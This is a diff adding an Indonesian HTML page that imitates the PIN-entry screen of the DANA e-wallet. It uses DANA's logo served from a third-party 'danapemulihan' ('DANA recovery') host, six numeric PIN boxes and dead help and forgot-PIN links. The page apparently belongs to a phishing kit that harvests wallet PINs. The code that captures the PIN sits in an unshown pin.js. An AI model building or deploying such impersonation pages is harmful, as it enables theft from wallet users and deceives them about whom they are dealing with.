@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Masukkan PIN</title>
+    <link rel="stylesheet" href="pin.css">
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="DANA Logo">
+        </div>
+    </div>
+
+    <div class="content">
+        <h2>Masukkan PIN</h2>
+
+        <!-- Kotak PIN -->
+        <div class="pin-container">
+            <div class="pin-inputs">
+                <input id="pin1" maxlength="1" pattern="[0-9]*" type="text" inputmode="numeric" class="pin-input"/>
+                <input id="pin2" maxlength="1" pattern="[0-9]*" type="text" inputmode="numeric" class="pin-input"/>
+                <input id="pin3" maxlength="1" pattern="[0-9]*" type="text" inputmode="numeric" class="pin-input"/>
+                <input id="pin4" maxlength="1" pattern="[0-9]*" type="text" inputmode="numeric" class="pin-input"/>
+                <input id="pin5" maxlength="1" pattern="[0-9]*" type="text" inputmode="numeric" class="pin-input"/>
+                <input id="pin6" maxlength="1" pattern="[0-9]*" type="text" inputmode="numeric" class="pin-input"/>
+            </div>
+
+            <!-- Tampilkan tulisan -->
+            <div class="show-text">Tampilkan</div>
+
+            <!-- Teks di bawah kotak PIN -->
+            <div class="pin-bottom-text">
+                <p>• <a href="#" class="help">bantuan</a> atau <a href="#" class="forgot-pin">lupa PIN?</a></p>
+            </div>
+        </div>
+    </div>
+</div>
+    <script src="pin.js"></script>
+</body>
+</html>
